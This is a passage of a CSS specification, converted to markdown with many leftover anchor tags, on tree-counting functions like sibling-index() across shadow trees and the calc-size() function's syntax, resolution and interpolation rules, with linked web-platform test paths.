A [tree-counting function](#tree-counting-functions) is a type of [loosely-matched](https://drafts.csswg.org/css-shadow-1/#tree-scoped-name-loosely-matched) [tree-scoped reference](https://drafts.csswg.org/css-shadow-1/#css-tree-scoped-reference), which is resolved as if the element were given an automatic [tree-scoped name](https://drafts.csswg.org/css-shadow-1/#css-tree-scoped-name) that matches an identical automatic name on the <a id="ref-for-css-tree-scoped-reference①"></a>tree-scoped reference of the <a id="ref-for-tree-counting-functions②"></a>tree-counting function. If the reference fails to match (because the element is, for example, in a descendent shadow tree from the stylesheet), the function returns 0.

<a id="ref-for-concept-tree"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This restriction is to avoid leaking shadow tree information to outer [trees](https://dom.spec.whatwg.org/#concept-tree).

<a id="ref-for-funcdef-sibling-index④"></a>

<a id="ref-for-pseudo-element③"></a>

<a id="ref-for-concept-shadow-tree"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-f9d62804"></a> The following examples show how [sibling-index()](#funcdef-sibling-index) resolves for [pseudo-elements](https://drafts.csswg.org/selectors-4/#pseudo-element) and across [shadow tree](https://dom.spec.whatwg.org/#concept-shadow-tree) boundaries:
>
> ```css
> #target {
>   /* Based on the sibling-index() of #target */
>   width: calc(sibling-index() * 10px);
> }
> #target::before {
>   /* Based on the sibling-index() of #target */
>   width: calc(sibling-index() * 10px);
> }
> #target::before::marker {
>   /* Based on the sibling-index() of #target */
>   width: calc(sibling-index() * 10px);
> }
> ::slotted(*)::before {
>   /* Based on the sibling-index() of the slotted element in the outer tree */
>   width: calc(sibling-index() * 10px);
> }
> ::part(my-part) {
>   /* Returns 0px, because referencing a shadow tree */
>   width: calc(sibling-index() * 10px);
> }
> :host {
>   /* Based on the host's sibling-index() in the outer tree */
>   width: calc(sibling-index() * 10px);
> }
> ```
<a id="ref-for-nth-child-pseudo①"></a>

<a id="ref-for-tree-counting-functions③"></a>

<a id="ref-for-flat-tree"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Like [:nth-child()](https://drafts.csswg.org/selectors-4/#nth-child-pseudo) and other counting selectors, the [tree-counting functions](#tree-counting-functions) operate on the DOM tree, rather than the [flat tree](https://drafts.csswg.org/css-shadow-1/#flat-tree) like most CSS operations do. They may, in the future, have variants that support counting <a id="ref-for-flat-tree①"></a>flat tree siblings.

<a id="ref-for-typedef-complex-real-selector-list"></a>

<a id="ref-for-nth-child-pseudo②"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: These functions may, in the future, be extended to accept an of [\<complex-real-selector-list\>](https://drafts.csswg.org/selectors-4/#typedef-complex-real-selector-list) argument, similar to [:nth-child()](https://drafts.csswg.org/selectors-4/#nth-child-pseudo), to filter on a subset of the children.

<a id="ref-for-funcdef-calc-size"></a>

## <a id="calc-size"></a>11.  Calculating With Intrinsic Sizes: the [calc-size()](#funcdef-calc-size) function

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/calc-size/calc-size-aspect-ratio-001.html`
- `css/css-values/calc-size/calc-size-aspect-ratio-002.html`
- `css/css-values/calc-size/calc-size-aspect-ratio-003.html`
- `css/css-values/calc-size/calc-size-aspect-ratio-004.html`
- `css/css-values/calc-size/calc-size-aspect-ratio-005.html`
- `css/css-values/calc-size/calc-size-flex-001.html`
- `css/css-values/calc-size/calc-size-flex-002.html`
- `css/css-values/calc-size/calc-size-flex-003.html`
- `css/css-values/calc-size/calc-size-flex-004.html`
- `css/css-values/calc-size/calc-size-flex-005.html`
- `css/css-values/calc-size/calc-size-flex-006.html`
- `css/css-values/calc-size/calc-size-flex-007.html`
- `css/css-values/calc-size/calc-size-flex-008.html`
- `css/css-values/calc-size/calc-size-flex-009.html`
- `css/css-values/calc-size/calc-size-flex-basis-on-column.html`
- `css/css-values/calc-size/calc-size-flex-basis-on-row.html`
- `css/css-values/calc-size/calc-size-grid-repeat.html`
- `css/css-values/calc-size/calc-size-height-box-sizing.html`
- `css/css-values/calc-size/calc-size-height.html`
- `css/css-values/calc-size/calc-size-min-max-sizes-001.html`
- `css/css-values/calc-size/calc-size-min-max-sizes-002.html`
- `css/css-values/calc-size/calc-size-min-max-sizes-003.html`
- `css/css-values/calc-size/calc-size-min-max-sizes-004.html`
- `css/css-values/calc-size/calc-size-min-max-sizes-005.html`
- `css/css-values/calc-size/calc-size-min-max-sizes-006.html`
- `css/css-values/calc-size/calc-size-no-body-height-quirk-001.html`
- `css/css-values/calc-size/calc-size-parsing.html`
- `css/css-values/calc-size/calc-size-svg-001-crash.html`
- `css/css-values/calc-size/calc-size-typed-om.html`
- `css/css-values/calc-size/calc-size-width-box-sizing.html`
- `css/css-values/calc-size/calc-size-width.html`
- `css/css-values/calc-size/interpolate-size-computed.html`
- `css/css-values/calc-size/interpolate-size-parsing.html`

<a id="ref-for-typedef-length-percentage①⑨"></a>

<a id="ref-for-funcdef-calc⑥"></a>

<a id="ref-for-valdef-width-auto①"></a>

<a id="ref-for-valdef-width-fit-content"></a>

<a id="ref-for-cyclic-percentage-size"></a>

Transitioning between two [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) sizes, or slightly adjusting one, can be done easily with [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc): halfway between 100% and 20px is calc(50% + 10px), for example. But these operations are no longer possible if the size you want to adjust or transition to/from is a non-numeric value such as [auto](https://drafts.csswg.org/css-sizing-3/#valdef-width-auto) or [fit-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-fit-content) or a [cyclic percentage size](https://drafts.csswg.org/css-sizing-3/#cyclic-percentage-size). [\[CSS-SIZING-3\]](#biblio-css-sizing-3)

The <a id="funcdef-calc-size"></a>calc-size() function allows math and transition/animation to be performed on these sizes in a safe, well-defined way. Its syntax is as follows:

<a id="ref-for-funcdef-calc-size①"></a>

<a id="ref-for-typedef-calc-size-basis"></a>

<a id="ref-for-comb-comma③⓪"></a>

<a id="ref-for-typedef-calc-sum①⑨"></a>

<a id="typedef-calc-size-basis"></a>

<a id="ref-for-typedef-calc-size-basis①"></a>

<a id="ref-for-typedef-calc-size-size-keyword"></a>

<a id="ref-for-comb-one①①⓪"></a>

<a id="ref-for-typedef-calc-sum②⓪"></a>

<a id="ref-for-comb-one①①①"></a>

<a id="ref-for-funcdef-calc-size②"></a>

<a id="ref-for-comb-one①①②"></a>

```text
<calc-size()> = calc-size( <calc-size-basis>, <calc-sum> )
<calc-size-basis> = [ <size-keyword> | <calc-sum> | <calc-size()> | any ]
```
<a id="ref-for-funcdef-calc-size③"></a>

<a id="ref-for-calc-size-basis"></a>

The first argument given is the <a id="calc-size-basis"></a>calc-size basis, which represents the size the [calc-size()](#funcdef-calc-size) is based on, and the second is the <a id="calc-size-calculation"></a>calc-size calculation, which represents the size that <a id="ref-for-funcdef-calc-size④"></a>calc-size() will actually resolve to, based on the [calc-size basis](#calc-size-basis).

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-4b9209ec"></a> Some examples:
>
> ```text
> height: calc-size(auto, 0);           /* used height is zero */
> height: calc-size(auto, 50%);         /* used height is 50% of the container */
> height: calc-size(auto, size / 2);    /* used height is 50% of auto */
> height: calc-size(auto, size);        /* used height is auto */
> height: calc-size(auto, size + 10px); /* used height is auto + 10px */
> height: calc-size(auto, round(up, size, 20px));
>                                       /* used height is rounded up to the
>                                          nearest multiple of 20px */
> height: calc-size(any,  size / 2);    /* declaration is invalid */
> ```
<a id="ref-for-calc-size-basis①"></a>

The [calc-size basis](#calc-size-basis) values are:

<a id="typedef-calc-size-size-keyword"></a>\<size-keyword\>

<a id="ref-for-funcdef-calc-size⑤"></a>

<a id="ref-for-propdef-width⑥"></a>

<a id="ref-for-valdef-width-auto②"></a>

<a id="ref-for-valdef-width-min-content"></a>

<a id="ref-for-valdef-width-stretch"></a>

<a id="ref-for-funcdef-width-fit-content"></a>

<a id="ref-for-valdef-width-fit-content①"></a>

Indicates that the [calc-size()](#funcdef-calc-size) is basing its size off of the specified keyword. Represents any sizing keywords allowed in the context where the function is used. For example, in [width](https://drafts.csswg.org/css-sizing-3/#propdef-width), it matches [auto](https://drafts.csswg.org/css-sizing-3/#valdef-width-auto), [min-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-min-content), [stretch](https://drafts.csswg.org/css-sizing-3/#valdef-width-stretch), etc. Also allows any related sizing functions, like the [fit-content()](https://drafts.csswg.org/css-sizing-4/#funcdef-width-fit-content) function in <a id="ref-for-propdef-width⑦"></a>width/etc., which is a variation of the [fit-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-fit-content) keyword. For all purposes other than actually resolving the size, the <a id="ref-for-funcdef-calc-size⑥"></a>calc-size() acts like this keyword.

<a id="ref-for-calc-size-calculation"></a>

<a id="ref-for-valdef-calc-size-size"></a>

The [calc-size calculation](#calc-size-calculation) will use the corresponding size as the value of its [size](#valdef-calc-size-size) keyword.

<a id="ref-for-typedef-calc-sum②①"></a>

<a id="valdef-calc-size-calc-sum"></a>[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum)

<a id="ref-for-funcdef-calc-size⑦"></a>

<a id="ref-for-calc-calculation⑥"></a>

<a id="ref-for-funcdef-calc⑦"></a>

<a id="ref-for-definite"></a>

<a id="ref-for-indefinite"></a>

Indicates that the [calc-size()](#funcdef-calc-size) is basing its size off of the specified [calculation](https://drafts.csswg.org/css-values-4/#calc-calculation). For all purposes other than actually resolving the size, the <a id="ref-for-funcdef-calc-size⑧"></a>calc-size() acts like this <a id="ref-for-calc-calculation⑦"></a>calculation wrapped in a [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) (including, for example, whether it represents a [definite](https://drafts.csswg.org/css-sizing-3/#definite) or [indefinite](https://drafts.csswg.org/css-sizing-3/#indefinite) size).

<a id="ref-for-calc-size-calculation①"></a>

<a id="ref-for-valdef-calc-size-size①"></a>

The [calc-size calculation](#calc-size-calculation) will use the corresponding size as the value of its [size](#valdef-calc-size-size) keyword.

<a id="ref-for-funcdef-calc-size⑨"></a>

<a id="valdef-calc-size-calc-size"></a>[\<calc-size()\>](#funcdef-calc-size)

<a id="ref-for-funcdef-calc-size①⓪"></a>

Indicates that the outer [calc-size()](#funcdef-calc-size) is basing its size off of this inner <a id="ref-for-funcdef-calc-size①①"></a>calc-size(), and will share the same behavior as it.

<a id="ref-for-calc-size-calculation②"></a>

<a id="ref-for-funcdef-calc-size①②"></a>

<a id="ref-for-valdef-calc-size-size②"></a>

<a id="ref-for-valdef-calc-size-any"></a>

The [calc-size calculation](#calc-size-calculation) will use the size of the inner [calc-size()](#funcdef-calc-size) as its [size](#valdef-calc-size-size) keyword. The <a id="ref-for-valdef-calc-size-size③"></a>size keyword is allowed, in this case, even if the inner <a id="ref-for-funcdef-calc-size①③"></a>calc-size() uses [any](#valdef-calc-size-any).

<a id="ref-for-funcdef-calc-size①④"></a>

<a id="ref-for-calc-size-basis②"></a>

<a id="ref-for-valdef-width-min-content①"></a>

<a id="ref-for-valdef-calc-size-size④"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-82e386de"></a> For example, in calc-size(calc-size(min-content, size / 2), size + 10%), the outer [calc-size()](#funcdef-calc-size) acts as if its [calc-size basis](#calc-size-basis) was [min-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-min-content), and will calculate its own [size](#valdef-calc-size-size) using the result of the inner <a id="ref-for-funcdef-calc-size①⑤"></a>calc-size(), equivalent to calc-size(min-content, size / 2 + 10%).

<a id="ref-for-funcdef-calc-size①⑥"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Why can [calc-size()](#funcdef-calc-size) be nested?
>
> <a id="ref-for-funcdef-calc-size①⑦"></a>
>
> Allowing [calc-size()](#funcdef-calc-size) as the basis argument means that authors can use a variable as the basis (like calc-size(var(--foo), size + 20px)) and it will <em>always work</em> as long as the variable was originally valid for the property.
>
> <a id="ref-for-funcdef-calc⑧"></a>
>
> Doing the same with just [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) doesn’t work - for example, if you have --foo: calc-size(min-content, size + 20px), or even just --foo: min-content, then calc( (var(--foo)) + 20px ) fails.
>
> The nesting is simplified away during interpolation, and at used-value time, so the basis always ends up as a simple value by the time interpolation and other effects occur; see [§ 11.2.1 Simplifying calc-size()](#simplifying-calc-size).

<a id="valdef-calc-size-any"></a>any

<a id="ref-for-funcdef-calc-size①⑧"></a>

<a id="ref-for-definite①"></a>

Indicates that the [calc-size()](#funcdef-calc-size) does not depend on any additional information, and thus can be interpolated with <em>any</em> other size. The <a id="ref-for-funcdef-calc-size①⑨"></a>calc-size() function represents a [definite size](https://drafts.csswg.org/css-sizing-3/#definite).

<a id="ref-for-calc-size-calculation③"></a>

<a id="ref-for-valdef-calc-size-size⑤"></a>

The [calc-size calculation](#calc-size-calculation) cannot use the [size](#valdef-calc-size-size) keyword; it is a syntax error for <a id="ref-for-valdef-calc-size-size⑥"></a>size to appear in the <a id="ref-for-calc-size-calculation④"></a>calc-size calculation.

<a id="ref-for-propdef-interpolate-size"></a>

<a id="ref-for-definite②"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: calc-size(any, ...) is mostly identical to calc(...), but it is automatically interpolatable with other sizing keywords, regardless of the [interpolate-size](#propdef-interpolate-size) value. (It does treat percentages slightly differently, if the containing block’s size is not [definite](https://drafts.csswg.org/css-sizing-3/#definite).)

<a id="ref-for-intrinsic-size-contribution"></a>

<a id="ref-for-funcdef-calc-size②⓪"></a>

<a id="ref-for-calc-size-calculation⑤"></a>

For the purpose of sizing (including for [intrinsic size contributions](https://drafts.csswg.org/css-sizing-3/#intrinsic-size-contribution)), [calc-size()](#funcdef-calc-size) resolves to the result of its [calc-size calculation](#calc-size-calculation).

<a id="ref-for-typedef-calc-sum②②"></a>

<a id="ref-for-cssnumericvalue-type"></a>

<a id="ref-for-cssnumericvalue-match"></a>

<a id="ref-for-typedef-length-percentage②⓪"></a>

<a id="ref-for-length-value①③"></a>

<a id="ref-for-funcdef-calc⑨"></a>

<a id="ref-for-calculation-contexts①"></a>

<a id="ref-for-funcdef-calc-size②①"></a>

For either argument, if a [\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) is given, its [type](https://drafts.css-houdini.org/css-typed-om-1/#cssnumericvalue-type) must [match](https://drafts.css-houdini.org/css-typed-om-1/#cssnumericvalue-match) [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage), and it must resolve to a [\<length\>](https://drafts.csswg.org/css-values-4/#length-value). See [CSS Values 4 § 10.9 Type Checking](https://drafts.csswg.org/css-values-4/#calc-type-checking). Like [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc), it inherits the property’s [calculation context](https://drafts.csswg.org/css-values-4/#calculation-contexts). However, a [\<calc-size()\>](#funcdef-calc-size) is specifically <em>not</em> a <a id="ref-for-length-value①④"></a>\<length\>; any place that wants to accept <a id="ref-for-funcdef-calc-size②②"></a>calc-size() must explicitly include it in its grammar.

<a id="ref-for-calc-size-calculation⑥"></a>

<a id="ref-for-typedef-calc-keyword"></a>

<a id="ref-for-length-value①⑤"></a>

<a id="ref-for-used-value①⓪"></a>

Within the [calc-size calculation](#calc-size-calculation), the <a id="valdef-calc-size-size"></a>size is a [\<calc-keyword\>](https://drafts.csswg.org/css-values-4/#typedef-calc-keyword) which is a [\<length\>](https://drafts.csswg.org/css-values-4/#length-value), and resolves at [used value](https://drafts.csswg.org/css-cascade-5/#used-value) time to the size specified above.

<a id="ref-for-funcdef-calc①⓪"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Why not just allow intrinsic keywords in [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc)?
>
> <a id="ref-for-funcdef-calc-size②③"></a>
>
> In theory, rather than introducing [calc-size()](#funcdef-calc-size), we could have defined calc(auto \* .5) to be valid, allowing interpolation to work as normal.
>
> This has the minor issue that mixing keywords still wouldn’t be allowed, but it wouldn’t be as obvious (that is, calc((min-content + max-content)/2) looks reasonable, but would be disallowed).
>
> <a id="ref-for-definite③"></a>
>
> <a id="ref-for-valdef-width-auto③"></a>
>
> The larger issue, though, is that this wouldn’t allow us to smoothly transition percentages. calc(50%) is only half the size of calc(100%) when percentages are [definite](https://drafts.csswg.org/css-sizing-3/#definite) in the context; if they’re not, the two values will usually be the same size (depending on the context, either 0px or [auto](https://drafts.csswg.org/css-sizing-3/#valdef-width-auto)-sized).
>
> Using a new function that explicitly separates the size you’re calculating against from the calculation itself lets us get smooth interpolation in <em>all</em> cases.
>
> <a id="ref-for-funcdef-calc①①"></a>
>
> An additional consideration is that there are many effects, some small and some large, that depend on whether an element is intrinsically sized or definite. Consider, for example, [margin collapsing](https://www.w3.org/TR/CSS2/box.html#collapsing-margins). Using [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) would mean that the answer to the question “is the element intrinsically-sized” can have one answer in the middle of a transition (“yes”, for calc(min-content \* .2 + 20px \* .8))), but a different answer at the end of the transition (“no”, for calc(20px)), causing the layout to jump at the end of an otherwise-smooth transition.
>
> <a id="ref-for-propdef-opacity"></a>
>
> (This issue is similar to the stacking-layer changes that can occur when animating from opacity:1 to [opacity: 0](https://drafts.csswg.org/css-color-4/#propdef-opacity): any non-1 value forces a stacking context, but 1 does not. With <a id="ref-for-propdef-opacity①"></a>opacity you can get around this by animating to .999, which is visually indistinguishable from 1 but forces a stacking context. It’s not as reasonable to ask people to animate to calc(auto \* .0001) to ensure it retains its intrinsic-ness.)
>
> Using a new function that identifies itself as nominally being a keyword size, like calc-size(auto, 20px), means we can maintain stable layout behaviors the entire time, even when the actual size is a definite length.

<a id="ref-for-funcdef-calc-size②④"></a>

### <a id="resolving-calc-size"></a>11.1.  Resolving [calc-size()](#funcdef-calc-size)

<a id="ref-for-used-value①①"></a>

<a id="ref-for-funcdef-calc-size②⑤"></a>

Before [used value](https://drafts.csswg.org/css-cascade-5/#used-value) time, [calc-size()](#funcdef-calc-size) functions are not resolved or simplified. (But see [§ 11.2 Interpolating calc-size()](#interpolate-calc-size).)

<a id="ref-for-used-value①②"></a>

<a id="ref-for-calc-size-calculation⑦"></a>

<a id="ref-for-funcdef-calc①②"></a>

<a id="ref-for-calc-size-basis③"></a>

<a id="ref-for-valdef-calc-size-size⑦"></a>

<a id="ref-for-definite④"></a>

At [used value](https://drafts.csswg.org/css-cascade-5/#used-value) time, the [calc-size calculation](#calc-size-calculation) is resolved just like the value of a [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) expression, by substituting in the used value of the [calc-size basis](#calc-size-basis) for the [size](#valdef-calc-size-size) keyword in the <a id="ref-for-calc-size-calculation⑧"></a>calc-size calculation, and evaluating any percentages normally (if they are [definite](https://drafts.csswg.org/css-sizing-3/#definite)) or against 0px (if they are not).

<a id="ref-for-calc-size-basis④"></a>

<a id="ref-for-funcdef-calc-size②⑥"></a>

<a id="ref-for-definite⑤"></a>

<a id="ref-for-behave-as-auto"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Percentages in the [calc-size basis](#calc-size-basis) resolve as normal so you can always smoothly transition to <em>any</em> size, regardless of its value or behavior. For example, calc-size(100%, size) is guaranteed to interpolate smoothly with calc-size(100%, 0px), producing intermediate values like calc-size(100%, size \* .5). Without [calc-size()](#funcdef-calc-size), interpolation from 100% to 0px only works as expected if the percentage is [definite](https://drafts.csswg.org/css-sizing-3/#definite); otherwise, the intermediate values like calc(50%) might all [behave as auto](https://drafts.csswg.org/css-sizing-3/#behave-as-auto) and not change size at all.
>
> <a id="ref-for-calc-size-calculation⑨"></a>
>
> <a id="ref-for-funcdef-calc-size②⑦"></a>
>
> <a id="ref-for-valdef-width-min-content②"></a>
>
> Percentages in the [calc-size calculation](#calc-size-calculation), on the other hand, are resolved to 0px when they would otherwise be indefinite, to avoid making the [calc-size()](#funcdef-calc-size) potentially act in two different ways. There are some cases where a [min-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-min-content) size, for example, will cause different layout effects than a 100% size, and so a <a id="ref-for-funcdef-calc-size②⑧"></a>calc-size() has to commit to one behavior or the other.

<a id="ref-for-funcdef-calc-size②⑨"></a>

### <a id="interpolate-calc-size"></a>11.2. <a id="interp-calc-size"></a> Interpolating [calc-size()](#funcdef-calc-size)

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/calc-size/animation/calc-size-height-interpolation.html`
- `css/css-values/calc-size/animation/calc-size-interpolation-expansion.html`
- `css/css-values/calc-size/animation/calc-size-width-interpolation.html`
- `css/css-values/calc-size/animation/interpolate-size-height-composition.html`
- `css/css-values/calc-size/animation/interpolate-size-height-interpolation.html`
- `css/css-values/calc-size/animation/interpolate-size-interpolation.html`
- `css/css-values/calc-size/animation/interpolate-size-logical-properties-interpolation.html`
- `css/css-values/calc-size/animation/interpolate-size-max-height-composition.html`
- `css/css-values/calc-size/animation/interpolate-size-max-height-interpolation.html`
- `css/css-values/calc-size/animation/interpolate-size-max-width-composition.html`
- `css/css-values/calc-size/animation/interpolate-size-max-width-interpolation.html`
- `css/css-values/calc-size/animation/interpolate-size-min-height-composition.html`
- `css/css-values/calc-size/animation/interpolate-size-min-height-interpolation.html`
- `css/css-values/calc-size/animation/interpolate-size-min-width-composition.html`
- `css/css-values/calc-size/animation/interpolate-size-min-width-interpolation.html`
- `css/css-values/calc-size/animation/interpolate-size-which-value.html`
- `css/css-values/calc-size/animation/interpolate-size-width-composition.html`
- `css/css-values/calc-size/animation/interpolate-size-width-interpolation.html`

<a id="ref-for-funcdef-calc-size③⓪"></a>

<a id="ref-for-calc-size-basis⑤"></a>

<a id="ref-for-calc-size-prepare-for-interpolation"></a>

Whether two [calc-size()](#funcdef-calc-size) functions can be interpolated depends on their [calc-size basis](#calc-size-basis) values (after being [prepared for interpolation](#calc-size-prepare-for-interpolation)):

<a id="ref-for-calc-size-prepare-for-interpolation①"></a>

If either function returned failure from being [prepared for interpolation](#calc-size-prepare-for-interpolation)

The values cannot be interpolated.

If they are identical

<a id="ref-for-calc-size-basis⑥"></a>

The result’s [calc-size basis](#calc-size-basis) is that basis value.

<a id="ref-for-valdef-calc-size-any①"></a>

If either is [any](#valdef-calc-size-any)

<a id="ref-for-calc-size-basis⑦"></a>

<a id="ref-for-valdef-calc-size-any②"></a>

The result’s [calc-size basis](#calc-size-basis) is the non-[any](#valdef-calc-size-any) basis.

<a id="ref-for-valdef-calc-size-any③"></a>

Otherwise (if they don’t match and neither side is [any](#valdef-calc-size-any))

The values cannot be interpolated.

<a id="ref-for-calc-size-calculation①⓪"></a>

If they can be interpolated, the result’s [calc-size calculation](#calc-size-calculation) is the interpolation of the two input <a id="ref-for-calc-size-calculation①①"></a>calc-size calculations.

<a id="ref-for-funcdef-calc-size③①"></a>

<a id="ref-for-valdef-width-min-content③"></a>

<a id="ref-for-valdef-width-max-content"></a>

<a id="ref-for-valdef-width-auto④"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: These interpolation restrictions ensure that a [calc-size()](#funcdef-calc-size) doesn’t try to act in two different ways at once. There are some cases where a [min-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-min-content) and [max-content](https://drafts.csswg.org/css-sizing-3/#valdef-width-max-content) would produce different layout behaviors, for example, so the <a id="ref-for-funcdef-calc-size③②"></a>calc-size() has to masquerade as one or the other. This, unfortunately, means you can’t transition between keywords, like going from [auto](https://drafts.csswg.org/css-sizing-3/#valdef-width-auto) to <a id="ref-for-valdef-width-min-content④"></a>min-content.

<a id="ref-for-funcdef-calc-size③③"></a>

<a id="ref-for-typedef-length-percentage②①"></a>

<a id="ref-for-typedef-calc-size-size-keyword①"></a>

<a id="ref-for-typedef-calc-sum②③"></a>

Some [calc-size()](#funcdef-calc-size) values can also be interpolated with a [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) or an [\<size-keyword\>](#typedef-calc-size-size-keyword). To determine whether the values can interpolate and what the interpolation behavior is, treat the non-<a id="ref-for-funcdef-calc-size③④"></a>calc-size() value as calc-size(any, <var>value</var> ) if the value is a [\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) or as calc-size( <var>value</var> , size) otherwise, and apply the rules above.

<a id="ref-for-funcdef-calc-size③⑤"></a>

<a id="ref-for-propdef-height①"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-4f69fe99"></a> For example, [calc-size()](#funcdef-calc-size) allows interpolation to/from [height: auto](https://drafts.csswg.org/css-sizing-3/#propdef-height):
>
> ```css
> details {
>   transition: height 1s;
> }
> details::details-content {
>   display: block;
> }
> details[open]::details-content {
>   height: auto;
> }
> details:not([open])::details-content {
>   height: calc-size(any, 0px);
> }
> ```
>
> <a id="ref-for-the-details-element"></a>
>
> <a id="ref-for-propdef-height②"></a>
>
> This will implicitly interpolate between calc-size(auto, size) and calc-size(any, 0px). Half a second after opening the <code><a href="https://html.spec.whatwg.org/multipage/interactive-elements.html#the-details-element">details</a></code>, the ::details-content wrapper’s [height](https://drafts.csswg.org/css-sizing-3/#propdef-height) will be calc-size(auto, size \* .5), half its open size; thruout the transition it’ll smoothly animate its height.

<a id="ref-for-definite⑥"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: These rules allow calc-size(any, [definite](https://drafts.csswg.org/css-sizing-3/#definite) length) to <em>always</em> interpolate smoothly, regardless of how the other side of the transition is specified.

<a id="ref-for-funcdef-calc-size③⑥"></a>

<a id="ref-for-typedef-length-percentage②②"></a>

<a id="ref-for-calc-size-calculation①②"></a>

<a id="ref-for-definite⑦"></a>

<a id="ref-for-calc-size-basis⑧"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This "upgrade a plain value into a [calc-size()](#funcdef-calc-size)" behavior puts [\<length-percentage\>](https://drafts.csswg.org/css-values-4/#typedef-length-percentage) values into the [calc-size calculation](#calc-size-calculation). This allows values with percentages to interpolate with intrinsic size keywords, but does mean that when a percentage isn’t [definite](https://drafts.csswg.org/css-sizing-3/#definite), it’ll resolve to zero. If you want to resolve to the actual size the percentage would make the element, explicitly write a <a id="ref-for-funcdef-calc-size③⑦"></a>calc-size() with the value in its [calc-size basis](#calc-size-basis), like calc-size(50%, size).

<a id="ref-for-funcdef-calc-size③⑧"></a>

#### <a id="simplifying-calc-size"></a>11.2.1.  Simplifying [calc-size()](#funcdef-calc-size)

<a id="ref-for-math-function⑧"></a>

<a id="ref-for-calc-size-calculation①③"></a>

<a id="ref-for-calc-size-basis⑨"></a>

<a id="ref-for-typedef-calc-sum②④"></a>

<a id="ref-for-funcdef-calc-size③⑨"></a>

<a id="ref-for-simplify-a-calculation-tree②"></a>

<a id="ref-for-specified-value②"></a>

<a id="ref-for-computed-value②③"></a>

Identically to [math functions](https://drafts.csswg.org/css-values-4/#math-function), the [calc-size calculation](#calc-size-calculation) (and [calc-size basis](#calc-size-basis), if it’s a [\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum)) of a [calc-size()](#funcdef-calc-size) function is [simplified](https://drafts.csswg.org/css-values-4/#simplify-a-calculation-tree) at [specified value](https://drafts.csswg.org/css-cascade-5/#specified-value) and [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) time.

<a id="ref-for-interpolation①"></a>

<a id="ref-for-funcdef-calc-size④⓪"></a>

<a id="ref-for-calc-size-prepare-for-interpolation②"></a>

<a id="ref-for-calc-size-basis①⓪"></a>

<a id="ref-for-calc-size-calculation①④"></a>

<a id="ref-for-simplify-a-calculation-tree③"></a>

Before [interpolation](https://drafts.csswg.org/css-values-4/#interpolation), [calc-size()](#funcdef-calc-size) functions are [prepared for interpolation](#calc-size-prepare-for-interpolation) so their [calc-size basises](#calc-size-basis) can be compared, and their [calc-size calculations](#calc-size-calculation) can be interpolated properly. This is a more involved process than [simplifying a calculation tree](https://drafts.csswg.org/css-values-4/#simplify-a-calculation-tree), and can potentially fail.

<a id="ref-for-funcdef-calc-size④①"></a>

To <a id="calc-size-prepare-for-interpolation"></a>prepare for interpolation a [calc-size()](#funcdef-calc-size) function:

1.  <a id="ref-for-calc-size-basis①①"></a>

    First, simplify the [calc-size basis](#calc-size-basis), recursing as needed:

    <a id="ref-for-funcdef-calc-size④②"></a>

    <a id="ref-for-calc-size-basis①②"></a>

    If the [calc-size basis](#calc-size-basis) is a [calc-size()](#funcdef-calc-size) function itself

    <a id="ref-for-calc-size-basis①③"></a>

    <a id="ref-for-calc-size-calculation①⑤"></a>

    <a id="ref-for-substitute-into-a-calc-size-calculation"></a>

    The [calc-size basis](#calc-size-basis) of the outer function is replaced with that of the inner function, and the inner function’s [calc-size calculation](#calc-size-calculation) is [substituted](#substitute-into-a-calc-size-calculation) into the outer function’s <a id="ref-for-calc-size-calculation①⑥"></a>calc-size calculation.

    <a id="ref-for-length-value①⑥"></a>

    <a id="ref-for-cssnumericvalue-match①"></a>

    <a id="ref-for-cssnumericvalue-type①"></a>

    <a id="ref-for-typedef-calc-sum②⑤"></a>

    <a id="ref-for-calc-size-basis①④"></a>

    Otherwise, if the [calc-size basis](#calc-size-basis) is a [\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum) whose [type](https://drafts.css-houdini.org/css-typed-om-1/#cssnumericvalue-type) [matches](https://drafts.css-houdini.org/css-typed-om-1/#cssnumericvalue-match) [\<length\>](https://drafts.csswg.org/css-values-4/#length-value) (no percentage present)

    <a id="ref-for-substitute-into-a-calc-size-calculation①"></a>

    <a id="ref-for-calc-size-calculation①⑦"></a>

    Replace the basis with any, and the original basis is [substituted](#substitute-into-a-calc-size-calculation) into the [calc-size calculation](#calc-size-calculation).

    <a id="ref-for-typedef-calc-sum②⑥"></a>

